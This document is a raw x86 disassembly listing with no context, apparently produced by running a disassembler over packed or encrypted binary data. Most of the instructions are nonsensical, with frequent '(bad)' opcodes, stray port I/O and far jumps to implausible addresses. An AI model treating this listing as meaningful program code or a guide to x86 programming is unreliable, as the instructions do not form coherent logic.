  40ddf1:	stos   DWORD PTR es:[edi],eax
  40ddf2:	(bad)  
  40ddf3:	cmp    esp,esi
  40ddf5:	lock mov edi,0x3b1a0
  40ddfb:	je     0x40ddfd
	...
  40de0d:	add    BYTE PTR [esi],dl
  40de0f:	stos   DWORD PTR es:[edi],eax
  40de10:	dec    edi
  40de11:	sahf   
  40de12:	push   ds
  40de13:	psubsb mm4,QWORD PTR [eax-0x1d0163c6]
  40de1a:	mov    bl,0x12
  40de1c:	push   es
  40de1d:	push   0xe
  40de1f:	stos   DWORD PTR es:[edi],eax
  40de20:	push   ebx
  40de22:	lods   eax,DWORD PTR ds:[esi]
  40de23:	lock mov edi,0x3b1a0
  40de29:	pop    esp
  40de2a:	fisubr WORD PTR [edx+0xec6664f]
  40de30:	call   0xfedd18c1
  40de35:	push   0x5b
  40de37:	(bad)  [edi+eiz*8+0x70]
  40de3b:	sbb    ch,ah
  40de3d:	jmp    0x296be308
  40de42:	stos   BYTE PTR es:[edi],al
  40de43:	lds    eax,FWORD PTR [edi]
  40de45:	jmp    0x9a2d2128
  40de4a:	xchg   esp,eax
  40de4b:	adc    cl,BYTE PTR [eax]
  40de4d:	adc    DWORD PTR [ebx+0x701eff3e],eax
  40de53:	xchg   ebx,eax
  40de54:	pop    ds
  40de55:	pushf  
  40de56:	inc    ebp
  40de57:	mov    BYTE PTR [ebp+edi*8-0xe],bh
  40de5b:	adc    DWORD PTR [esi],eax
  40de5d:	add    BYTE PTR [edx],ah
  40de5f:	mov    edi,0x8d0721c2
  40de65:	inc    ebp
  40de66:	in     eax,dx
  40de67:	aaa    
  40de68:	push   DWORD PTR [ebp+0x11]
  40de6b:	jg     0x40dede
  40de6d:	pop    ecx
  40de6e:	push   cs
  40de6f:	addr16 cmp eax,0x0
	...
  40de82:	add    BYTE PTR [eax],al
  40de84:	stc    
  40de85:	std    
  40de86:	add    eax,0xfe569c83
  40de8b:	je     0x40dea4
  40de8d:	lods   al,BYTE PTR ds:[esi]
  40de8e:	mov    esi,0xa4bc9
  40de93:	lea    edx,[edi+edx*2]
  40de96:	dec    esi
  40de97:	push   0xfffffff9
  40de99:	gs jae 0x40dea4
  40de9c:	mov    cl,0xe6
  40de9e:	pop    eax
  40de9f:	dec    DWORD PTR [esi+0x9ec4378]
  40dea5:	data16 jae 0x40deb0
  40dea8:	jno    0x40df00
  40deaa:	push   esi
  40deab:	jmp    FWORD PTR [esi-0x7e]
  40deae:	test   BYTE PTR [ecx],0xbb
  40deb1:	or     DWORD PTR [ebx+0x5fd9af8],eax
  40deb7:	sbb    DWORD PTR [edx+ebp*2-0x56688b02],0xffffffbe
  40debf:	leave  
  40dec0:	retf   
  40dec1:	or     al,BYTE PTR [eax]
  40dec3:	mov    ds:0x40ecc1,eax
  40dec8:	or     al,0x50
  40deca:	in     al,dx
  40decb:	push   eax
  40decc:	mov    bl,0xae
  40dece:	std    
  40decf:	jne    0x40de52
  40ded1:	outs   dx,BYTE PTR ds:[esi]
  40ded2:	dec    eax
  40ded3:	pop    ecx
  40ded4:	(bad)
  40deda:	add    BYTE PTR [ebp+0x6a4e6a94],cl
  40dee0:	dec    eax
  40dee1:	gs jae 0x40def0
  40dee4:	out    dx,al
  40dee5:	inc    DWORD PTR [edi]
  40dee7:	call   0x40deec
	...
  40def8:	add    BYTE PTR [eax],al
  40defa:	lock sbb DWORD PTR [eax-0x3a18c002],0x7
  40df02:	lock jp 0x40de92
  40df05:	jmp    0x40df7a
  40df07:	in     al,0x9f
  40df09:	mov    WORD PTR [ebp-0x7617cd6d],gs
  40df0f:	jb     0x40deb2
  40df11:	(bad)  
  40df12:	pop    ss
  40df13:	cmp    esp,DWORD PTR [eax-0x55547a02]
  40df19:	dec    esi
  40df1a:	lahf   
  40df1b:	mov    al,0xa1
  40df1d:	or     dh,BYTE PTR [eax]
  40df1f:	xor    al,0x13
  40df21:	(bad)  
  40df22:	jge    0x40debb
  40df24:	mov    eax,ds:0xddb7ec74
  40df29:	std    
  40df2a:	out    0x50,eax
  40df2c:	or     eax,0xa1b065c0
  40df31:	je     0x40df07
  40df33:	ja     0x40df57
  40df35:	push   ebp
  40df36:	iret   
  40df37:	js     0x40df04
  40df39:	shl    esp,0xaf
  40df3c:	aaa    
  40df3d:	mov    ecx,esp
  40df3f:	mov    BYTE PTR [edi],dl
  40df41:	or     al,0xc8
  40df43:	pop    esp
  40df44:	and    al,0xff
  40df46:	scas   eax,DWORD PTR es:[edi]
  40df47:	xchg   esp,eax
  40df48:	ret    0xd373
  40df4b:	adc    BYTE PTR [eax],bl
  40df4d:	adc    BYTE PTR [eax-0x78],al
  40df50:	int3   
  40df51:	pusha  
  40df52:	xchg   edi,eax
  40df53:	and    BYTE PTR [ebx],dh
  40df55:	push   0x426578
  40df5a:	xchg   DWORD PTR [edx+0xfefa],edi
	...
  40df70:	add    eax,0xfdff3294
  40df75:	xchg   edi,eax
  40df76:	stos   BYTE PTR es:[edi],al
  40df77:	in     eax,0x70
  40df79:	fsub   DWORD PTR [ecx-0x5e8d5a19]
  40df7f:	(bad)  
  40df80:	sub    ebp,ebp
  40df82:	idiv   bh
  40df84:	mov    esp,0xd7af7206
  40df89:	push   es
  40df8a:	jmp    0x386f6541
  40df8f:	inc    esi
  40df90:	mov    cl,0x6
  40df92:	push   cs
  40df93:	sbb    ah,ah
  40df95:	sub    al,0xe3
  40df97:	mov    ds:0x53110ea4,al
  40df9c:	es cdq 
  40df9e:	cmc    
  40df9f:	sub    dh,al
  40dfa1:	push   es
  40dfa2:	(bad)  
  40dfa3:	pusha  
  40dfa4:	(bad)  
  40dfa5:	mov    esp,0x99f04329
  40dfaa:	push   ebx
  40dfab:	adc    BYTE PTR [edx-0x17e82a04],bl
  40dfb1:	scas   al,BYTE PTR es:[edi]
  40dfb2:	outs   dx,DWORD PTR ds:[esi]
  40dfb3:	mov    eax,ds:0x45098f6
  40dfb8:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfba:	jle    0x40dfe8
  40dfbc:	rol    DWORD PTR [eax+ebp*1+0x4],0xdf
  40dfc1:	adc    bl,ch
  40dfc3:	sub    eax,0xc1b97f4
  40dfc8:	fadd   DWORD PTR [ebp+0x2fc6a19d]
  40dfce:	jmp    0x9aaed6
  40dfd3:	mov    esi,0x0
	...
  40dfe4:	add    BYTE PTR [eax],al
  40dfe6:	xor    al,BYTE PTR [esi-0x17]
  40dfe9:	mov    al,ds:0x130b24
  40dfee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfef:	adc    ah,cl
  40dff1:	stos   DWORD PTR es:[edi],eax
  40dff2:	or     bl,BYTE PTR [eax+0x70fa16d]
  40dff8:	jmp    0x38702dad
  40dffd:	inc    ebp
  40dffe:	xor    DWORD PTR [edi],eax
  40e000:	push   esi
  40e001:	pop    ss
  40e002:	in     al,dx
  40e003:	sub    al,0xa
  40e005:	mov    eax,ds:0x38510efc
  40e00a:	outs   dx,DWORD PTR ds:[esi]
  40e00b:	cwde   
  40e00c:	cmp    eax,0x6f02c
  40e011:	inc    esi
  40e012:	rcr    BYTE PTR [edi],cl
  40e014:	fisubr DWORD PTR [edx-0x6300f94e]
  40e01a:	jmp    FWORD PTR [ebx+eiz*1]
  40e01d:	push   ds
  40e01e:	fisttp WORD PTR [esi]
  40e020:	call   0xfeda70f9
  40e025:	and    BYTE PTR [esi],ch
  40e027:	add    BYTE PTR [eax],al
  40e029:	pushf  
  40e02a:	jl     0x40dfd8
  40e02c:	and    BYTE PTR ds:0x83002e50,0x45
  40e033:	cdq    
  40e034:	je     0x40e017
  40e036:	dec    ebx
  40e037:	dec    edx
  40e038:	pop    edx
  40e039:	out    0x50,al
  40e03b:	pop    DWORD PTR [ebp+ebx*8-0x25]
  40e03f:	adc    al,0x44
  40e041:	sub    ah,dh
  40e043:	xchg   edi,eax
  40e044:	je     0x40e027
  40e046:	dec    ebx
  40e047:	dec    ebx
  40e048:	inc    esi
	...
  40e05a:	add    BYTE PTR [eax],al
  40e05c:	nop
  40e05d:	cwde   
  40e05e:	je     0x40e01d
  40e060:	nop
  40e061:	adc    cl,BYTE PTR [eax]
  40e063:	sar    edx,0x3c
  40e066:	jmp    FWORD PTR [esi-0x16fc3a56]
  40e06c:	push   es
  40e06d:	mov    ebx,gs
  40e06f:	push   0xffffffaf
  40e071:	fwait
  40e072:	imul   ebp,ecx,0x14fed40d
  40e078:	in     al,0xae
  40e07a:	sbb    al,0x23
  40e07c:	push   ecx
  40e07d:	cwde   
  40e07e:	mov    BYTE PTR [eax+edx*2],ah
  40e081:	pop    ds
  40e082:	sub    DWORD PTR ds:0xf4ff0733,0x661baeeb
  40e08c:	push   eax
  40e08d:	cwde   
  40e08e:	(bad)  
  40e08f:	aam    0x67
  40e091:	cwde   
  40e092:	je     0x40e075
  40e094:	dec    ebx
  40e095:	aas    
  40e096:	pop    edx
  40e097:	dec    esi
  40e098:	push   eax
  40e099:	into   
  40e09a:	rol    DWORD PTR [eax],0x5d
  40e09d:	add    edx,DWORD PTR [ebp-0x75]
  40e0a0:	mov    ch,0x82
  40e0a2:	ret    0x33f8
  40e0a5:	add    ebp,DWORD PTR [edx+0x34]
  40e0a8:	push   es
  40e0a9:	icebp  
  40e0aa:	pop    es
  40e0ab:	call   0x3fbd95
  40e0b0:	rol    BYTE PTR [eax-0x4],0x68
  40e0b4:	sar    BYTE PTR [edi],cl
  40e0b6:	inc    ecx
  40e0b7:	add    dh,ah
  40e0b9:	lock pop es
  40e0bb:	call   0x3e46c2
	...
  40e0d0:	add    BYTE PTR [eax],al
  40e0d2:	add    DWORD PTR [ebx],0x68
  40e0d5:	stos   DWORD PTR es:[edi],eax
  40e0d6:	dec    ebp
  40e0d7:	inc    esp
  40e0d8:	add    BYTE PTR [eax-0x42],ch
  40e0db:	aas    
  40e0dc:	inc    ecx
  40e0dd:	add    BYTE PTR [esi],dl
  40e0df:	mov    ebp,0x2d8296b
  40e0e4:	call   0xfdb8a78e
  40e0e9:	or     ecx,DWORD PTR [ecx-0x2]
  40e0ec:	mov    DWORD PTR ds:[ebx+esi*2],ebx
  40e0f0:	data16 mov BYTE PTR [ebx+0x4b],dh
  40e0f4:	add    BYTE PTR [eax-0x37],ch
  40e0f7:	or     ch,bh
  40e0f9:	mov    esi,0x41415c31
  40e0fe:	fnstenv [ebp+0x73]
  40e101:	clc    
  40e102:	lock popw es
  40e105:	call   0x3fd743
  40e10a:	icebp  
  40e10b:	cmp    BYTE PTR [eax-0x1d66c0],0xff
  40e112:	jbe    0x40e149
  40e114:	addr16 fcmove st,st(2)
  40e117:	dec    ebx
  40e118:	add    bh,bh
  40e11a:	pushf  
  40e11b:	jb     0x40e11a
  40e11d:	jne    0x40e0a0
  40e11f:	bound  esi,QWORD PTR [edi+edi*2+0x26]
  40e123:	jbe    0x40e122
  40e125:	jne    0x40e117
  40e127:	aaa    
  40e128:	lods   al,BYTE PTR ds:[esi]
  40e129:	dec    ecx
  40e12a:	adc    al,0x45
  40e12c:	lahf   
  40e12d:	(bad)  
  40e12e:	in     eax,0x4b
  40e130:	lahf   
  40e131:	je     0x40e12b
  40e133:	aaa    
  40e134:	popa   
  40e135:	pop    eax
	...
  40e146:	add    BYTE PTR [eax],al
  40e148:	pop    edi
  40e149:	(bad)  
  40e14b:	shr    esp,0x9f
  40e14e:	aaa    
  40e14f:	mov    ebx,DWORD PTR [ecx+eiz*1-0x38]
  40e153:	sti    
  40e154:	ficomp DWORD PTR [edi+0x733f3528]
  40e15a:	or     ch,al
  40e15c:	rcl    DWORD PTR [esi-0x63],1
  40e15f:	(bad)  
  40e160:	jns    0x40e1c5
  40e162:	sahf   
  40e163:	addr16 pop edi
  40e165:	ins    BYTE PTR es:[edi],dx
  40e166:	inc    ebx
  40e167:	add    BYTE PTR [edi],bl
  40e169:	adc    ecx,DWORD PTR [ebx]
  40e16b:	call   0xfede8700
  40e170:	rdpmc  
  40e172:	mov    al,ds:0xaa977dfe
  40e177:	mov    ebx,DWORD PTR [ecx+0x32c89dbc]
  40e17d:	lods   al,BYTE PTR ds:[esi]
  40e17e:	add    dl,BYTE PTR [ebp+0x7b]
  40e181:	mov    ebx,0x39e4c381
  40e186:	add    al,0x6a
  40e188:	es pop ebp
  40e18a:	pop    ss
  40e18b:	or     al,cl
  40e18d:	(bad)  
  40e18e:	cmp    edi,edi
  40e190:	iret   
  40e191:	push   ss
  40e192:	dec    eax
  40e193:	cld    
  40e194:	pop    eax
  40e195:	pusha  
  40e196:	inc    esi
  40e197:	inc    ecx
  40e198:	lock jl 0x40e1b2
  40e19b:	or     al,cl
  40e19d:	push   esp
  40e19e:	pushf  
  40e19f:	(bad)  
  40e1a0:	scas   eax,DWORD PTR es:[edi]
  40e1a1:	mov    WORD PTR [edi],ss
  40e1a3:	cld    
  40e1a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1a5:	call   0xfe9e:0xf73be80a
	...
  40e1bc:	add    BYTE PTR [eax],al
  40e1be:	test   eax,0x25000661
  40e1c3:	pop    es
  40e1c4:	jb     0x40e175
  40e1c6:	jb     0x40e192
  40e1c8:	pop    esp
  40e1c9:	sub    eax,esi
  40e1cb:	and    BYTE PTR [esi],bl
  40e1cd:	lahf   
  40e1ce:	cld    
  40e1cf:	inc    BYTE PTR [eax-0x62]
  40e1d2:	(bad)  
  40e1d3:	xchg   ebp,eax
  40e1d4:	inc    ebp
  40e1d5:	mov    WORD PTR [edx+edx*4+0x47b3c9d0],gs
  40e1dc:	jmp    0x413fbe7f
  40e1e1:	popf   
  40e1e2:	dec    esp
  40e1e3:	xchg   ebp,eax
  40e1e4:	and    eax,0x1d92bc9e
  40e1e9:	sbb    al,ch
  40e1eb:	sahf   
  40e1ec:	ret    0x373c
  40e1ef:	xchg   ebp,eax
  40e1f0:	pop    ds
  40e1f1:	shl    ebx,0x6
  40e1f4:	pushf  
  40e1f5:	mov    bl,BYTE PTR [ebx]
  40e1f7:	mov    DWORD PTR [edi+ebx*4],esp
  40e1fa:	mov    DWORD PTR [esi],eax
  40e1fc:	sbb    ebx,0x16
  40e1ff:	sbb    esp,ecx
  40e201:	stos   DWORD PTR es:[edi],eax
  40e202:	cmp    eax,0x789de62e
  40e207:	dec    ebx
  40e208:	(bad)  [edx+eiz*1]
  40e20b:	dec    edx
  40e20c:	sub    BYTE PTR [edi+esi*8],al
  40e20f:	sbb    ah,cl
  40e211:	stos   DWORD PTR es:[edi],eax
  40e212:	mov    esp,0xe69dc592
  40e217:	sbb    bh,BYTE PTR [ebp-0x3f009b63]
  40e21d:	fwait
  40e21e:	aas    
  40e21f:	xchg   esp,eax
  40e220:	lods   eax,DWORD PTR ds:[esi]
  40e221:	retf   
	...
  40e232:	add    BYTE PTR [eax],al
  40e234:	mov    cl,0xb
  40e236:	jmp    0x9de45d71
  40e23b:	pop    ss
  40e23c:	in     al,dx
  40e23d:	sahf   
  40e23e:	push   ecx
  40e23f:	cmp    eax,0xc3e194b7
  40e244:	and    esi,edx
  40e246:	adc    BYTE PTR [edi+0x33e94633],ah
  40e24c:	mov    BYTE PTR [edi],dh
  40e24e:	add    BYTE PTR [esi],dl
  40e250:	jne    0x40e1e7
  40e252:	dec    edi
  40e253:	outs   dx,BYTE PTR ds:[esi]
  40e254:	out    0xf6,eax
  40e256:	dec    edi
  40e257:	data16 (bad) 
  40e25a:	out    0x56,eax
  40e25c:	inc    esi
  40e25d:	xchg   ebp,eax
  40e25e:	inc    BYTE PTR [ecx+0x29]
  40e261:	xor    bh,bh
  40e263:	dec    esi
  40e264:	cmp    eax,esi
  40e266:	or     ebp,ecx
  40e268:	push   ds
  40e269:	sub    bl,0x6a
  40e26c:	sub    BYTE PTR [esi+edx*2+0x3920f3c3],bl
  40e273:	cs out 0xfe,eax
  40e276:	out    0x95,eax
  40e278:	or     edx,DWORD PTR [esi+edi*8-0x756d4890]
  40e27f:	aam    0x6d
  40e281:	in     al,dx
  40e282:	inc    eax
  40e283:	jmp    0x7d40b7fb
  40e288:	pop    es
  40e289:	pop    ds
  40e28a:	fsub   QWORD PTR [ebp+0x15706b2]
  40e290:	mov    ebp,0xf8e8ffe2
  40e295:	(bad)  
  40e296:	jae    0x40e2de
	...
  40e2a8:	add    BYTE PTR [eax],al
  40e2aa:	mov    ebp,0x5d45d99e
  40e2af:	xchg   ebp,eax
  40e2b0:	or     ch,BYTE PTR [ecx+0x248939df]
  40e2b6:	mov    WORD PTR [esp+esi*2-0x10ee63f],ss
  40e2bd:	xor    al,0xec
  40e2bf:	sahf   
  40e2c0:	test   DWORD PTR [esi+0x34fe9474],esi
  40e2c6:	ins    BYTE PTR es:[edi],dx
  40e2c7:	sbb    eax,0xfedea61c
  40e2cc:	out    0x20,eax
  40e2ce:	pop    ebp
  40e2cf:	xchg   esp,eax
  40e2d0:	(bad)  
  40e2d1:	xchg   esi,eax
  40e2d2:	fimul  WORD PTR [esi+0x1a8cca69]
  40e2d8:	or     BYTE PTR [eax],al
  40e2da:	and    ebx,0xe01efffe
  40e2e0:	out    dx,al
  40e2e1:	inc    esp
  40e2e2:	enter  0xff0a,0x75
  40e2e6:	add    DWORD PTR [eax+0x73],esp
  40e2e9:	pop    esi
  40e2ea:	push   cs
  40e2eb:	jae    0x40e2f6
  40e2ed:	shl    BYTE PTR [ebp-0x6b00b16b],0x6f
  40e2f4:	dec    esi
  40e2f5:	inc    DWORD PTR [edi+edi*8-0x19]
  40e2f9:	ins    BYTE PTR es:[edi],dx
  40e2fa:	pop    es
  40e2fb:	jae    0x40e2fa
  40e2fd:	call   0x3fb10b
  40e302:	push   ds
  40e303:	std    
  40e304:	imul   eax
  40e306:	ror    ebp,0xfe
  40e309:	dec    DWORD PTR ds:0xb9beb7
	...
  40e31f:	add    dh,bl
  40e321:	jb     0x40e320
  40e323:	(bad)  
  40e324:	(bad)  [ecx]
  40e326:	aaa    
  40e327:	pop    es
  40e328:	test   BYTE PTR [ebx+0x72ed75fd],cl
  40e32e:	jae    0x40e338
  40e330:	add    DWORD PTR [ebp-0x30e100aa],edx
  40e336:	enter  0x15c2,0x7
  40e33a:	push   ebp
  40e33b:	mov    ebx,DWORD PTR ds:0x210c736f
  40e341:	push   eax
  40e342:	pop    esp
  40e343:	call   FWORD PTR [esi]
  40e345:	add    eax,eax
  40e347:	je     0x40e325
  40e349:	fdivp  st(5),st
  40e34b:	inc    esp
  40e34c:	sbb    BYTE PTR [ebx],cl
  40e34e:	push   eax
  40e34f:	call   0x3fb06e
  40e354:	stc    
  40e355:	ins    DWORD PTR es:[edi],dx
  40e356:	jae    0x40e368
  40e358:	jmp    0x614956ca
  40e35d:	xchg   ecx,eax
  40e35e:	aam    0xff
  40e360:	pop    esi
  40e361:	arpl   WORD PTR [edx+ebx*2-0x10],bp
  40e365:	js     0x40e301
  40e367:	enter  0xb4b2,0x2
  40e36b:	push   ebp
  40e36c:	jnp    0x40e3ea
  40e36e:	xchg   bl,al
  40e370:	cwde   
  40e371:	stc    
  40e372:	sub    eax,0x99560a00
  40e377:	je     0x40e371
  40e379:	xchg   DWORD PTR [edx-0x72d678aa],ecx
  40e37f:	inc    esp
  40e380:	jl     0x40e397
  40e382:	fld    DWORD PTR [ebp+0x0]
	...
  40e394:	add    BYTE PTR [eax],al
  40e396:	enter  0x25e,0x80
  40e39a:	das    
  40e39b:	mov    al,ds:0x46d8590e
  40e3a0:	inc    eax
  40e3a1:	inc    ecx
  40e3a2:	lock js 0x40e34f
  40e3a5:	fld    DWORD PTR [eax+eiz*4]
  40e3a8:	add    cl,BYTE PTR [ebx]
  40e3aa:	xor    BYTE PTR [esi+edx*8+0x56],bl
  40e3ae:	pop    eax
  40e3af:	jmp    0x40e3d7
  40e3b1:	(bad)  
  40e3b2:	aas    
  40e3b3:	xchg   ebp,eax
  40e3b4:	ret    0x273
  40e3b7:	daa    
  40e3b8:	inc    ecx
  40e3b9:	clc    
  40e3ba:	das    
  40e3bb:	jnp    0x40e357
  40e3bd:	imul   ecx,DWORD PTR [edx],0x8081109
  40e3c3:	sub    bl,BYTE PTR [ebx+0xf9917fe]
  40e3c9:	clc    
  40e3ca:	call   0x1bb7:0xf87499c3
  40e3d1:	(bad)  
  40e3d2:	push   DWORD PTR [eax+0x45f87499]
  40e3d8:	out    0xfe,eax
  40e3da:	gs test al,0xaa
  40e3dd:	imul   esp,edi,0xffffffc8
  40e3e0:	cdq    
  40e3e1:	(bad)  
  40e3e2:	gs enter 0xfdaa,0x39
  40e3e7:	pop    ecx
  40e3e8:	cdq    
  40e3e9:	sti    
  40e3ea:	add    esp,DWORD PTR [eax+0x5b]
  40e3ed:	inc    bh
  40e3ef:	push   es
  40e3f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3f1:	call   0x6a3d:0x2e060c1
  40e3f8:	xchg   ebp,eax
  40e3f9:	adc    BYTE PTR [eax],al
	...
  40e40b:	add    BYTE PTR [ecx+edx*4+0x25980c13],ch
  40e412:	push   ds
  40e413:	fwait
  40e414:	sahf   
  40e415:	xor    DWORD PTR [eax+0x1c06f3c5],esi
  40e41b:	(bad)  
  40e41c:	fwait
  40e41d:	test   DWORD PTR [edi+edx*4+0x2de91d1e],esp
  40e424:	mov    ebx,0x880bd391
  40e429:	or     edi,DWORD PTR [esi-0x5c809166]
  40e42f:	xchg   edi,eax
  40e430:	jp     0x40e405
  40e432:	outs   dx,BYTE PTR ds:[esi]
  40e433:	jmp    0x40e3e5
  40e435:	push   es
  40e436:	imul   ebx,edx,0x2ba91557
  40e43c:	stc    
  40e43d:	dec    ebx
  40e43e:	test   al,0x3
  40e440:	lahf   
  40e441:	sahf   
  40e442:	mov    eax,0xf1913fe7
  40e447:	ret    
  40e448:	ret    
  40e449:	in     eax,0xbd
  40e44b:	stos   DWORD PTR es:[edi],eax
  40e44c:	mov    ds:0xfa9a0e25,al
  40e451:	(bad)  
  40e452:	jl     0x40e450
  40e454:	scas   eax,DWORD PTR es:[edi]
  40e455:	push   ds
  40e456:	jmp    0x8090eb5e
  40e45b:	div    BYTE PTR [edi+eax*2+0x1b0733e9]
  40e462:	icebp  
  40e463:	stos   DWORD PTR es:[edi],eax
  40e464:	nop
  40e465:	adc    dh,bl
  40e467:	cdq    
  40e468:	jae    0x942f7d9d
  40e46e:	sbb    esp,eax
	...
  40e480:	add    BYTE PTR [eax],al
  40e482:	test   al,0x90
  40e484:	lds    ebx,FWORD PTR [ecx-0x23716a22]
  40e48a:	out    dx,al
  40e48b:	sbb    DWORD PTR [eax],eax
  40e48d:	test   eax,0xaefc1b69
  40e492:	idiv   esi
  40e494:	out    0x9b,eax
  40e496:	add    dl,BYTE PTR [eax-0x3954c102]
  40e49c:	add    ebp,ecx
  40e49e:	fidivr WORD PTR [ebx-0x15]
  40e4a1:	push   0xffffffb0
  40e4a3:	test   al,0x82
  40e4a5:	les    ebp,FWORD PTR [edx+eiz*8+0x19f3e940]
  40e4ac:	add    al,0xa0
  40e4ae:	mov    dh,0xfc
  40e4b0:	inc    DWORD PTR [edx]
  40e4b2:	in     al,dx
  40e4b3:	sbb    al,0x0
  40e4b5:	rcr    DWORD PTR [eax-0x6f],cl
  40e4b8:	je     0x40e4a7
  40e4ba:	lds    eax,FWORD PTR [esi]
  40e4bc:	push   0xffffffe9
  40e4be:	fwait
  40e4bf:	jmp    0x4144:0x7df3e92a
  40e4c6:	jns    0x40e4e3
  40e4c8:	clc    
  40e4c9:	push   ecx
  40e4ca:	and    ch,BYTE PTR [esi]
  40e4cc:	push   DWORD PTR [esi]
  40e4ce:	jnp    0x40e51b
  40e4d0:	cld    
  40e4d1:	test   DWORD PTR cs:[esi+0x1e679cfe],0x2e71eff
  40e4dc:	push   0xffffffe9
  40e4de:	fld    QWORD PTR [esi]
  40e4e0:	call   0xfed0f9ca
  40e4e5:	je     0x40e4e7
	...
  40e4f7:	add    bh,bl
  40e4f9:	call   0x8300:0x1cf3934f
  40e500:	add    eax,0xf6ee001e
  40e505:	xchg   edx,eax
  40e506:	(bad)  
  40e507:	cld    
  40e508:	sub    al,0xe2
  40e50a:	inc    eax
  40e50b:	jmp    0x614f3486
  40e510:	jnp    0x40e4a1
  40e512:	(bad)  
  40e513:	jmp    0x1351f8c
  40e518:	bound  ebx,QWORD PTR [edx-0x2c66ba75]
  40e51e:	imul   eax,DWORD PTR [eax],0x689933
  40e524:	xor    DWORD PTR [ebx+0x6ec94143],esi
  40e52a:	jae    0x40e520
  40e52c:	push   esi
  40e52d:	(bad)  [edi]
  40e52f:	test   DWORD PTR [ecx-0x15],ebx
  40e532:	pop    esi
  40e533:	(bad)  
  40e534:	cld    
  40e535:	jp     0x40e51d
  40e537:	stos   DWORD PTR es:[edi],eax
  40e538:	stc    
  40e539:	ins    DWORD PTR es:[edi],dx
  40e53a:	std    
  40e53b:	mov    esp,ecx
  40e53d:	bound  ecx,QWORD PTR [ecx]
  40e53f:	ror    BYTE PTR [ebp+0x7175ff3b],0x5b
  40e546:	jmp    0x40e5a0
  40e548:	push   ss
  40e549:	outs   dx,DWORD PTR ds:[esi]
  40e54a:	xchg   DWORD PTR [ebp+0x25],eax
  40e54d:	outs   dx,DWORD PTR ds:[esi]
  40e54e:	jae    0x40e540
  40e550:	mov    cl,0x39
  40e552:	push   ecx
  40e553:	push   DWORD PTR [esi-0x49178c92]
  40e559:	add    ah,ch
  40e55b:	inc    DWORD PTR [eax]
	...
  40e56d:	add    BYTE PTR [ebx+esi*2+0x6e682ce6],bl
  40e574:	std    
  40e575:	or     ebx,DWORD PTR [ecx]
  40e577:	add    BYTE PTR [ebx],bl
  40e579:	push   0xbeef0349
  40e57e:	(bad)  
  40e57f:	add    BYTE PTR [eax],cl
  40e581:	call   0x3fc5d2
  40e586:	test   BYTE PTR [eax],0xe8
  40e589:	call   FWORD PTR [edi+eiz*2+0x5b2175fd]
  40e590:	pop    ebx
  40e591:	push   ebp
  40e592:	push   es
  40e593:	ja     0x40e592
  40e595:	jne    0x40e59c
  40e597:	pop    esp
  40e598:	xchg   esp,eax
  40e599:	pop    eax
  40e59a:	push   ss
  40e59b:	ja     0x40e59a
  40e59d:	jne    0x40e5b8
  40e59f:	(bad)  
  40e5a0:	stc    
  40e5a1:	dec    edi
  40e5a2:	lock mov ah,0x96
  40e5a5:	mov    bh,BYTE PTR ds:0xdf118ab4
  40e5ab:	retf   
  40e5ac:	(bad)  
  40e5ad:	inc    BYTE PTR [edx-0x68]
  40e5b0:	xchg   ebp,eax
  40e5b1:	je     0x40e57f
  40e5b3:	enter  0x581a,0xc7
  40e5b7:	pop    ebp
  40e5b8:	int3   
  40e5b9:	shr    esp,0x9f
  40e5bc:	das    
  40e5bd:	mov    eax,esp
  40e5bf:	ins    DWORD PTR es:[edi],dx
  40e5c0:	adc    BYTE PTR [eax+ebx*4],cl
  40e5c3:	cmp    DWORD PTR [eax],edi
  40e5c5:	jmp    DWORD PTR [edi-0x368c3d57]
  40e5cb:	idiv   eax
  40e5cd:	inc    esp
  40e5ce:	xor    DWORD PTR [eax+0xe832],esp
	...
  40e5e4:	and    ah,dh
  40e5e6:	xchg   esi,eax
  40e5e7:	(bad)  
  40e5e8:	and    BYTE PTR [eax],cl
  40e5ea:	inc    ebp
  40e5eb:	mov    edi,0x2aa030
  40e5f0:	lock cmp al,0x56
  40e5f3:	and    ebx,DWORD PTR [bp+di+0x43]
  40e5f7:	add    al,al
  40e5f9:	cmp    al,0x11
  40e5fb:	or     BYTE PTR [eax-0x48],cl
  40e5fe:	sbb    edi,edi
  40e600:	push   edi
  40e601:	cmp    bh,dl
  40e603:	push   edi
  40e604:	dec    edi
  40e605:	aad    0x96
  40e607:	je     0x40e5fd
  40e609:	inc    edi
  40e60a:	jle    0x40e667
  40e60c:	aas    
  40e60d:	in     eax,0xa
  40e60f:	sar    BYTE PTR [esi+esi*4+0x5eb5242a],0x2
  40e617:	push   eax
  40e618:	sbb    BYTE PTR [ecx+0x701fff36],bl
  40e61e:	sub    al,BYTE PTR [ecx+0x57]
  40e621:	pusha  
  40e622:	add    ch,BYTE PTR [eax-0x10]
  40e625:	lahf   
  40e626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e627:	mov    ebp,0x413f5098
  40e62c:	lock push es
  40e62e:	cmp    DWORD PTR [edi-0x2d2f0184],edx
  40e634:	push   0xffffff8e
  40e636:	aad    0xab
  40e638:	stc    
  40e639:	cs into 
  40e63b:	xchg   esi,eax
  40e63c:	test   al,0xc8
  40e63e:	lock add edi,DWORD PTR ds:0xb382cc82
  40e645:	mov    al,BYTE PTR [edx+0x4]
	...
  40e658:	add    BYTE PTR [eax],al
  40e65a:	pop    edx
  40e65b:	retf   
  40e65c:	lods   eax,DWORD PTR ds:[esi]
  40e65d:	adc    al,ch
  40e65f:	sahf   
  40e660:	aam    0x30
  40e662:	mov    bh,0x8d
  40e664:	outs   dx,DWORD PTR ds:[esi]
  40e665:	inc    eax
  40e666:	lods   al,BYTE PTR ds:[esi]
  40e667:	and    bl,dh
  40e669:	xchg   esi,eax
  40e66a:	sbb    al,0xff
  40e66c:	adc    BYTE PTR [ebx],0x9f
  40e66f:	lea    eax,[ebp-0xc722cd7]
  40e675:	or     ebx,DWORD PTR [eax-0x796989dc]
  40e67b:	and    ch,cl
  40e67d:	xchg   esi,eax
  40e67e:	add    al,0xff
  40e680:	push   eax
  40e681:	aaa    
  40e682:	ja     0x40e611
  40e684:	pop    ebp
  40e685:	xchg   esi,eax
  40e686:	in     al,0x8a
  40e688:	push   ebp
  40e689:	adc    al,bh
  40e68b:	sahf   
  40e68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e68d:	xor    BYTE PTR [edi-0x73],bl
  40e690:	das    
